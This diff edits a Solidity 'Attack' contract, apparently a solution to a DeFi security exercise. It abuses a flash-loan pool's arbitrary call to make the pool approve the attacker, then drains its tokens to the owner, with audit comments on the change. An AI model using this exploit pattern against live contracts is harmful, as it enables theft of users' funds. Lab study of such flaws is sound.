@@ -95,17 +95,21 @@ contract Attack {
     function attack(uint256 amount) external {
         require(msg.sender == owner, "Only owner can call");
 
+        // @audit why not to `owner`?
+        address payTo = address(this);
+
         lenderPool.flashLoan(
             0,
             address(this),
             address(valuableToken),
             abi.encodeWithSignature(
                 "approve(address,uint256)", //@audit-info no spaces between args
-                address(owner),
+                payTo,
                 amount
             )
         );
 
-        valuableToken.transferFrom(address(lenderPool), address(owner), amount);
+        valuableToken.transferFrom(address(lenderPool), payTo, amount);
+        valuableToken.transfer(owner, amount);
     }
 }
